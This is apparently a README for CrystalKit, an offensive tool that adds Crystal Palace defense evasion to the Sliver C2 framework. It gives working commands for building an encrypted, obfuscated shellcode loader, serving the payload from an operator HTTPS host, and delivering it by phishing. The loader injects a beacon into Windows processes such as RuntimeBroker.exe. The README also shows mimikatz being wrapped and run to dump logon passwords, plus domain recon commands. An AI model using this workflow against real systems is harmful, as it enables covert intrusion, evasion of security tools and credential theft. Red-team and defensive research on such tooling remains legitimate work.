# CrystalKit

Crystal Palace evasion for Sliver C2 — a Go rebuild of
[CrystalSliver](https://github.com/licitrasimone/CrystalSliver).

Same capabilities, same Sliver integration. No bash. No Python. One compiled binary.

---

## What it is

The **Crystal Kit** in Cobalt Strike replaces the default artifact templates (stager, loader,
post-ex jobs) with Crystal Palace-hardened versions. CrystalKit does the same for Sliver:

| Cobalt Strike Crystal Kit | CrystalKit (Sliver) |
|---------------------------|---------------------|
| Replace default stager/loader | `crystalkit implant` — wraps Sliver DLL in Crystal Palace PICO |
| Post-ex execution (execute-assembly) | `crystalkit postex` — wraps any DLL in Crystal Palace PICO |
| Sleep mask (XOR beacon in memory) | Crystal Palace `mask.c` — same technique, same C code |
| User-defined reflective loader (IAT hooks, stack spoof) | Crystal Palace `loader.c` — same C code |
| Staging over HTTP | `crystalkit stage --serve` — one-time HTTPS, ChaCha20-Poly1305 |

The evasion stack is identical — Crystal Palace's C code is unchanged. CrystalKit is a
Go rebuild of the operator tooling and staging layer around that C code.

---

## How it improves on CrystalSliver

| Area | CrystalSliver | CrystalKit |
|------|---------------|------------|
| Operator tooling | 5 bash scripts + Python | **Single Go binary** |
| Payload encryption | AES-256-CBC (no authentication) | **ChaCha20-Poly1305** (authenticated AEAD) |
| Staging | `payload.dat` copied to target disk | **HTTP/S fetch from operator machine** |
| URL lifetime | Permanent file on disk | **One-time token** — server dies after download |
| Stager memory API | `VirtualAlloc` / `VirtualProtect` | `NtAllocateVirtualMemory` / `NtProtectVirtualMemory` |
| Stager thread API | `CreateThread` | `NtCreateThreadEx` |
| Obfuscation | MinGW strip | Optional **garble** (strips symbols + obfuscates strings) |
| Python dependency | `gen_pico_header.py`, `gen_payload.py` | **Ported to Go** — no Python needed |
| Cross-platform | bash only | Linux / macOS / Windows |

---

## What's in this repo

```
crystalkit/
├── cmd/crystalkit/main.go          ← operator CLI (replaces all bash scripts)
├── cmd/stager/
│   ├── main.go                     ← Go stager: in-process shellcode runner (NT APIs)
│   └── ntdll.go                    ← NtAllocateVirtualMemory / NtProtectVirtualMemory / NtCreateThreadEx
├── cmd/loader/
│   ├── main.go                     ← Go process injector: fetch → decrypt → remote inject
│   ├── inject.go                   ← find/spawn host process, NtCreateThreadEx in remote
│   └── ntdll.go                    ← NT APIs for remote: NtAllocRemote / NtWriteMemory / NtProtectRemote
├── internal/crystal/
│   ├── pipeline.go                 ← Crystal Palace build pipeline (optional, for postex)
│   └── pico_header.go              ← Gen PICO header (port of gen_pico_header.py)
├── internal/stage/
│   ├── encrypt.go                  ← ChaCha20-Poly1305 encrypt
│   ├── server.go                   ← one-time HTTPS payload server
│   └── build.go                    ← cross-compile stager/loader with ldflags
├── c/
│   ├── crystal-loader/             ← Sliver Extension: load PICO from path
│   │   ├── crystal-loader.c        ← Initialize() entrypoint
│   │   ├── beacon_compatibility.c  ← CS BOF compat layer (BeaconPrintf etc.)
│   │   ├── beacon_compatibility.h
│   │   └── Makefile
│   └── crystal-exec/               ← Sliver Extension: shell via embedded PICO
│       ├── crystal-exec.c          ← Initialize() with embedded PICO
│       ├── crystalexec.c           ← post-ex DLL (CRT-free cmd runner)
│       └── Makefile
├── extension.json                  ← Sliver Extension manifest
├── .crystalenv.example
├── go.mod
└── Makefile
```

**Crystal Palace (optional):** Only needed for `postex` and `build-ext` commands that
wrap post-ex DLLs into Crystal Palace PICOs. The initial access flow (`inject` command)
is 100% Go with no Crystal Palace dependency.

**CrystalSliver C loader sources** (`crystal-kit-sliver/`): Only needed if using
`implant` + `stage` with Crystal Palace. Not required for the `inject` command.

---

## Prerequisites

| Tool | Check | Purpose |
|------|-------|---------|
| Go 1.21+ | `go version` | Build operator CLI + cross-compile stager |
| MinGW-w64 | `x86_64-w64-mingw32-gcc --version` | Compile Crystal Palace loader objects + extension DLLs |
| NASM | `nasm -v` | Assemble `draugr.asm` (stack spoof stub) |
| Java 17+ | `java -version` | Crystal Palace linker (called by `link`) |
| Crystal Palace | `ls $CRYSTAL_PALACE_HOME/link` | Crystal Palace `link` binary |
| garble | `garble version` | *Optional* — obfuscate stager binary |

---

## Setup

```bash
# 1. Clone CrystalKit
git clone https://github.com/yourname/crystalkit
cd crystalkit

# 2. Get the Crystal Palace C loader sources from CrystalSliver
git clone https://github.com/licitrasimone/CrystalSliver _crystalsliver
ln -s _crystalsliver/crystal-kit-sliver crystal-kit-sliver

# 3. Build the operator CLI
go mod tidy
go build -o crystalkit ./cmd/crystalkit

# 4. (optional) Install garble for stager obfuscation
go install mvdan.cc/garble@latest

# 5. Configure Crystal Palace
cp .crystalenv.example .crystalenv
$EDITOR .crystalenv
#   CRYSTAL_PALACE_HOME=/opt/crystal-palace   ← required
#   SLIVER_SERVER=/opt/sliver/sliver-server   ← needed for --profile mode
```

---

## Usage

### 1. Initial Access — Go process injector (no Crystal Palace needed)

**Step 1 — Generate Sliver shellcode**

In the Sliver console (shellcode format avoids two-Go-runtime conflicts):

```
sliver > generate --format shellcode --os windows --arch amd64 \
         --c2 https://teamserver.example.com --save /tmp/beacon.bin
```

**Step 2 — Build the Go process injector**

```bash
./crystalkit inject \
  --shellcode /tmp/beacon.bin \
  --url       https://192.168.45.200:8443/p \
  --output    build/ \
  --garble \
  --serve
```

This command:
1. Generates a random ChaCha20-Poly1305 key + nonce
2. Encrypts `beacon.bin` → `build/payload.enc`
3. Cross-compiles `build/loader.exe` with key + URL baked in via `-ldflags`
4. Starts a one-time HTTPS server on `:8443` that shuts down after the payload is fetched

**Step 3 — Deliver loader.exe to target**

Via phishing, exploit, etc. When executed on the target:

1. Fetches `payload.enc` over HTTPS (self-signed cert, skip verify)
2. Decrypts with ChaCha20-Poly1305 — silent exit if tampered
3. Searches for a host process: `RuntimeBroker.exe` → `SgrmBroker.exe` → `WerFault.exe` → `dllhost.exe`
4. If none found, spawns `notepad.exe` suspended
5. `NtAllocateVirtualMemory(host, RW)` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory(host, RX)`
6. `NtCreateThreadEx(host)` — beacon runs inside the host process, loader exits

**Step 4 — Catch callback**

```
sliver > sessions
```

---

### 1b. Initial Access — Crystal Palace PICO (requires Crystal Palace)

If you have Crystal Palace, you can wrap a Sliver shared DLL instead:

```bash
# Generate a Sliver DLL
sliver > generate --format shared --os windows --arch amd64 \
         --c2 https://teamserver.example.com --save /tmp/beacon.dll

# Wrap with Crystal Palace (requires CRYSTAL_PALACE_HOME in .crystalenv)
./crystalkit implant --dll /tmp/beacon.dll --output build/

# Encrypt and stage via in-process stager
./crystalkit stage \
  --pico build/implant.bin \
  --url  https://192.168.45.200:8443/p \
  --serve
```

---

### 2. Post-Execution — run tools through Crystal Palace

First time only: build and install the Sliver Extension.

```bash
# Build both extension DLLs
./crystalkit build-ext --output build/

# Package into Sliver extension tarball
./crystalkit bundle --output build/crystal-loader-0.1.0.tar.gz
```

```
sliver > extensions install /opt/crystalkit/build/crystal-loader-0.1.0.tar.gz
```

**Wrap a post-ex DLL**

```bash
./crystalkit postex --dll /opt/tools/mimikatz.dll --output build/
```

```
[+] Post-ex PICO → build/mimikatz.pico.bin
[i] In Sliver: crystal payload=build/mimikatz.pico.bin
[i] With args: crystal payload=build/mimikatz.pico.bin|<args>
```

**Run in an active Sliver session**

```
sliver (CORP-HTTP) > crystal payload=/opt/crystalkit/build/mimikatz.pico.bin
sliver (CORP-HTTP) > crystal payload=/opt/crystalkit/build/mimikatz.pico.bin|sekurlsa::logonpasswords exit
```

The `|` separator passes runtime arguments to the post-ex DLL without rebuilding the PICO.
This matches exactly how the CS Crystal Kit passes arguments to post-ex jobs.

**Bake arguments at wrap time (no pipe needed at runtime)**

```bash
./crystalkit postex --dll mimikatz.dll --args "sekurlsa::logonpasswords exit" --output build/
```

```
sliver (CORP-HTTP) > crystal payload=/opt/crystalkit/build/mimikatz.pico.bin
```

---

### 3. Shell Execution — commands through Crystal Palace

`crystal-exec` runs arbitrary shell commands through an embedded Crystal Palace PICO.
No file is written to disk on the target. The PICO is baked into the extension DLL at build time.

```
sliver (CORP-HTTP) > crystal-exec cmd=whoami /all
sliver (CORP-HTTP) > crystal-exec cmd=ipconfig /all
sliver (CORP-HTTP) > crystal-exec cmd=net user /domain
sliver (CORP-HTTP) > crystal-exec cmd=net localgroup administrators
sliver (CORP-HTTP) > crystal-exec cmd=tasklist /svc
```

---

### Serve a payload without re-staging

```bash
./crystalkit serve --payload build/payload.enc --port 8443
```

Prints the URL, serves the file once, shuts down.

---

## Command reference

```
# ── Initial access (no Crystal Palace) ─────────────────────────────────────
crystalkit inject          --shellcode <bin> --url <https-url>  [-o dir] [--serve] [--port n] [--garble]

# ── Initial access (Crystal Palace) ────────────────────────────────────────
crystalkit implant         --dll <file> | --profile <name>  [-o dir] [--env file]
crystalkit stage           --pico <file> --url <https-url>  [-o dir] [--serve] [--port n] [--garble]

# ── Payload server (standalone) ─────────────────────────────────────────────
crystalkit serve           --payload <file>                 [--port n]

# ── Post-execution (Crystal Palace) ─────────────────────────────────────────
crystalkit postex          --dll <file>                     [--args "str"] [-o dir] [--env file]
crystalkit build-ext                                        [-o dir] [--env file]
crystalkit bundle                                           [-o file.tar.gz] [--env file]
crystalkit gen-pico-header --input <pico.bin> --output <header.h>
```

Run `crystalkit <command> --help` for all flags.

---

## Build the extension DLLs manually

If you prefer to run the steps yourself:

```bash
# crystal-loader.x64.dll
make -C c/crystal-loader

# crystal-exec.x64.dll (4 steps)
cd c/crystal-exec

# Step 1: compile the CRT-free shell runner DLL
x86_64-w64-mingw32-gcc -Wall -Os -DBUILD_DLL -ffunction-sections -fdata-sections \
  crystalexec.c -o crystalexec.dll \
  -shared -Wl,--subsystem,windows -s -Wl,--gc-sections

# Step 2: wrap with Crystal Palace
cd ../../crystal-kit-sliver/postex-loader && make all
cd -
$CRYSTAL_PALACE_HOME/link \
  ../../crystal-kit-sliver/postex-loader/loader.spec \
  "$(pwd)/crystalexec.dll" \
  "$(pwd)/crystalexec.pico.bin" \
  %ARGFILE=/dev/null

# Step 3: generate C header (Go, no Python needed)
cd ../.. && ./crystalkit gen-pico-header \
  --input c/crystal-exec/crystalexec.pico.bin \
  --output c/crystal-exec/crystalexec_pico.h

# Step 4: compile the extension
cd c/crystal-exec
x86_64-w64-mingw32-gcc -Wall -Os -DBUILD_DLL -ffunction-sections -fdata-sections \
  crystal-exec.c -o crystal-exec.x64.dll \
  -shared -Wl,--subsystem,windows -s -Wl,--gc-sections
```

---

## Stager size note

The Go stager is ~2–4 MB vs ~17 KB for the original C stager. If binary size is a constraint,
use `crystalkit serve` to host the payload and deliver the original CrystalSliver C stager —
the server is compatible with any HTTP client.

---

## Troubleshooting

**`CRYSTAL_PALACE_HOME is not set`**  
Copy `.crystalenv.example` to `.crystalenv` and set the path.

**`Crystal Palace 'link' not found`**  
Your Crystal Palace distribution must contain a file named `link`. Check `$CRYSTAL_PALACE_HOME`.

**`loader directory not found: .../crystal-kit-sliver/loader`**  
Clone CrystalSliver and create the symlink:
```bash
git clone https://github.com/licitrasimone/CrystalSliver _crystalsliver
ln -s _crystalsliver/crystal-kit-sliver crystal-kit-sliver
```

**`make in .../loader: exit status 1`**  
Verify `x86_64-w64-mingw32-gcc` and `nasm` are in `$PATH`.

**Stager exits without callback**  
- Confirm the payload URL is reachable from the target.
- Confirm `crystalkit serve` or `crystalkit stage --serve` is running *before* the stager executes.
- Do not reuse `payload.enc` with a new stager — `crystalkit stage` generates a fresh key every run. The stager and payload must come from the same invocation.

---

## Suite Context

CrystalKit is part of the **Sliver Defense Evasion Suite**. See `/home/kali/EVASION_SUITE.md` for the full overview.

| Tool | Role |
|------|------|
| **CrystalKit** | This tool — Crystal Palace staging workflow for Sliver |
| **PalaceKit** | Free `crystalpalace.jar` replacement — COFF linker + spec evaluator |
| **MaskKit** | C shellcode sleep masker (NtWaitForSingleObject hook + XOR mask) |
| **SleepKit** | Go host binary sleep masker |
| **LoadKit** | In-memory PE execution via Sliver Extension DLL |

**CrystalKit + PalaceKit relationship**: CrystalKit wraps Crystal Kit C sources and handles the Sliver integration layer. PalaceKit replaces `crystalpalace.jar` as the COFF linker. For the Crystal Palace workflow without the jar, use PalaceKit directly.

---

## Credits

- **Crystal Palace** — upstream evasion framework (BSD-3-Clause); IAT hooks, call-stack  
  spoofing, XOR sleep mask, hash-based API resolution, PICO format
- **CrystalSliver** ([licitrasimone](https://github.com/licitrasimone/CrystalSliver)) —  
  original Sliver port; beacon compatibility layer; crystal-exec architecture
- **CS-Situational-Awareness-BOF** (TrustedSec, MIT) — beacon compatibility implementation
- **Sliver** ([BishopFox](https://github.com/BishopFox/sliver)) — C2 framework
